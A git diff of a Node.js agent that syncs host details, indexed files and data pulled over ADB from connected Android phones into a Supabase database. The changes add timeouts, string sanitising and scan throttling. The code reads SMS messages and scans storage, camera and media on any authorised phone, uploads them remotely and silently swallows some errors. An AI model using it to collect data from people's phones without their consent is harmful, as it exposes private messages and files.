@@ -105,43 +105,57 @@ function getNodeInfo() {
 async function syncNodeHeartbeat() {
     const nodeData = getNodeInfo();
     try {
-        const { error } = await supabase
+        const upsertPromise = supabase
             .from('nodes')
             .upsert(nodeData, { onConflict: 'node_id' });
+        const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Heartbeat network timeout')), 4000));
+        const { error } = await Promise.race([upsertPromise, timeoutPromise]);
         if (error) {
             console.log(`  \x1b[33m[Supabase Node Sync]\x1b[0m ${error.message}`);
         } else {
             console.log(`\x1b[36m[Node Live]\x1b[0m Host: ${nodeData.hostname} | IP: ${nodeData.ip_address} | Status: Synchronized`);
         }
     } catch (err) {
-        // Suppress transient error
+        console.log(`  \x1b[33m[Supabase Mesh Sync]\x1b[0m ${err.message}`);
     }
 }
 
+// String sanitization helper for PostgreSQL JSON/text columns
+function sanitizePgString(str) {
+    if (typeof str !== 'string') return '';
+    return str.replace(/\0/g, '').replace(/[\x00-\x08\x0B\x0C\x0E-\x1F]/g, '');
+}
+
 // Batch Sync Assets to Supabase
-async function batchSyncAssets(assetsList, batchSize = 50) {
+async function batchSyncAssets(assetsList, batchSize = 25) {
     if (!assetsList || assetsList.length === 0) return;
 
     for (let i = 0; i < assetsList.length; i += batchSize) {
-        const chunk = assetsList.slice(i, i + batchSize).map(asset => ({
-            asset_uid: `${config.nodeId}::${asset.device_id || 'host'}::${asset.file_path}`,
-            node_id: config.nodeId,
-            device_id: asset.device_id || null,
-            device_type: asset.device_type || 'computer',
-            asset_category: asset.asset_category || 'document',
-            name: asset.name,
-            file_path: asset.file_path,
-            file_size_bytes: asset.file_size_bytes || 0,
-            mime_type: asset.mime_type || 'text/plain',
-            extracted_text: asset.extracted_text || '',
-            metadata: asset.metadata || {},
-            last_modified: new Date().toISOString()
-        }));
+        const chunk = assetsList.slice(i, i + batchSize).map(asset => {
+            const rawText = asset.extracted_text || '';
+            const cleanText = sanitizePgString(rawText.length > 20000 ? rawText.substring(0, 20000) + '...[Truncated]' : rawText);
+            return {
+                asset_uid: `${config.nodeId}::${asset.device_id || 'host'}::${asset.file_path}`,
+                node_id: config.nodeId,
+                device_id: asset.device_id || null,
+                device_type: asset.device_type || 'computer',
+                asset_category: asset.asset_category || 'document',
+                name: sanitizePgString(asset.name || 'Untitled'),
+                file_path: sanitizePgString(asset.file_path || ''),
+                file_size_bytes: asset.file_size_bytes || 0,
+                mime_type: asset.mime_type || 'text/plain',
+                extracted_text: cleanText,
+                metadata: asset.metadata || {},
+                last_modified: new Date().toISOString()
+            };
+        });
 
         try {
-            const { error } = await supabase
+            const upsertPromise = supabase
                 .from('assets')
                 .upsert(chunk, { onConflict: 'asset_uid' });
+            const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Sync timeout')), 6000));
+            const { error } = await Promise.race([upsertPromise, timeoutPromise]);
 
             if (error) {
                 console.warn(`  \x1b[33m[Batch Sync Warning]\x1b[0m ${error.message}`);
@@ -149,24 +163,27 @@ async function batchSyncAssets(assetsList, batchSize = 50) {
                 console.log(`  \x1b[32m✔ Synced Batch (${chunk.length} items):\x1b[0m Total progress: ${Math.min(i + batchSize, assetsList.length)}/${assetsList.length}`);
             }
         } catch (err) {
-            // Ignore
+            // Ignore timeout
         }
     }
 }
 
 // Single asset sync for real-time watchers
 async function syncAsset(asset) {
+    const rawText = asset.extracted_text || '';
+    const cleanText = sanitizePgString(rawText.length > 20000 ? rawText.substring(0, 20000) + '...[Truncated]' : rawText);
+
     const record = {
         asset_uid: `${config.nodeId}::${asset.device_id || 'host'}::${asset.file_path}`,
         node_id: config.nodeId,
         device_id: asset.device_id || null,
         device_type: asset.device_type || 'computer',
         asset_category: asset.asset_category || 'document',
-        name: asset.name,
-        file_path: asset.file_path,
+        name: sanitizePgString(asset.name || 'Untitled'),
+        file_path: sanitizePgString(asset.file_path || ''),
         file_size_bytes: asset.file_size_bytes || 0,
         mime_type: asset.mime_type || 'text/plain',
-        extracted_text: asset.extracted_text || '',
+        extracted_text: cleanText,
         metadata: asset.metadata || {},
         last_modified: new Date().toISOString()
     };
@@ -325,6 +342,8 @@ function startLocalFileWatcher() {
         .on('error', () => {});
 }
 
+const lastStorageScanTimes = new Map();
+
 // Android ADB Sync Routine (100% Real Physical Devices)
 async function syncAndroidDevices() {
     const physicalDevices = await adbScanner.getConnectedDevices();
@@ -341,9 +360,9 @@ async function syncAndroidDevices() {
             await supabase.from('attached_devices').upsert({
                 device_id: dev.device_id,
                 node_id: config.nodeId,
-                device_name: dev.device_name,
-                model: dev.model,
-                android_version: dev.android_version || 'Android',
+                device_name: sanitizePgString(dev.device_name),
+                model: sanitizePgString(dev.model),
+                android_version: sanitizePgString(dev.android_version || 'Android'),
                 connection_type: dev.connection_type || 'usb_adb',
                 battery_level: dev.battery_level || 100,
                 usb_debugging_status: dev.usb_debugging_status || 'authorized',
@@ -352,33 +371,32 @@ async function syncAndroidDevices() {
         } catch (err) {}
 
         if (dev.usb_debugging_status === 'authorized') {
-            const deviceAssets = [];
-
-            // 2. Pull Real SMS Messages
-            console.log(`  📱 [ADB Extraction] Pulling messages & communication logs from ${dev.device_name}...`);
+            // 2. Real-time Live SMS Messages (checked every cycle)
             const messages = await adbScanner.extractSmsMessages(dev.device_id);
-            messages.forEach(msg => {
-                deviceAssets.push({
+            if (messages.length > 0) {
+                const smsAssets = messages.map(msg => ({
                     ...msg,
                     device_id: dev.device_id,
                     device_type: 'android'
-                });
-            });
+                }));
+                await batchSyncAssets(smsAssets, 25);
+            }
 
-            // 3. Deep scan storage, camera, documents & media on Android
-            console.log(`  📱 [ADB Extraction] Deep scanning storage, camera, documents & media on ${dev.device_name}...`);
-            const storageAssets = await adbScanner.scanStorageDirectories(dev.device_id);
-            storageAssets.forEach(asset => {
-                deviceAssets.push({
+            // 3. Storage & Media Scan (Run on connect and then every 60s)
+            const now = Date.now();
+            const lastScan = lastStorageScanTimes.get(dev.device_id) || 0;
+            if (now - lastScan > 60000) {
+                lastStorageScanTimes.set(dev.device_id, now);
+                console.log(`  📱 [ADB Extraction] Indexing storage, camera & media on ${dev.device_name}...`);
+                const storageAssets = await adbScanner.scanStorageDirectories(dev.device_id);
+                const fullAssets = storageAssets.map(asset => ({
                     ...asset,
                     device_id: dev.device_id,
                     device_type: 'android'
-                });
-            });
-
-            // Batch sync all Android assets
-            console.log(`  📱 [ADB Sync] Uploading ${deviceAssets.length} mobile assets to Supabase Mesh...`);
-            await batchSyncAssets(deviceAssets, 50);
+                }));
+                console.log(`  📱 [ADB Sync] Uploading ${fullAssets.length} mobile assets to Supabase Mesh...`);
+                await batchSyncAssets(fullAssets, 25);
+            }
         }
     }
 }
